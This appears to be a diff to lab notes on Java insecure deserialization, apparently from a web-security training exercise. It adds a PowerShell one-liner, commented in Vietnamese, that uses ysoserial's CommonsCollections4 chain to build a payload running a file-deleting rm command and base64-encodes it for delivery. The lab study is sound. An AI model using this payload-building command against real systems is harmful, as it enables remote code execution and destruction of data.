@@ -20,3 +20,4 @@
 #### Step1: $content = [System.IO.File]::ReadAllBytes("$PWD/raw.bin")
 #### Step2: $base64 = [Convert]::ToBase64String($content)
 #### Step3: Set-Content -Path payload.txt -Value $base64 -Encoding Ascii
+#### hoặc ( java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' > raw.bin; $b64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$PWD/raw.bin")); Set-Content -Path payload.txt -Value $b64 -Encoding Ascii; Remove-Item raw.bin)
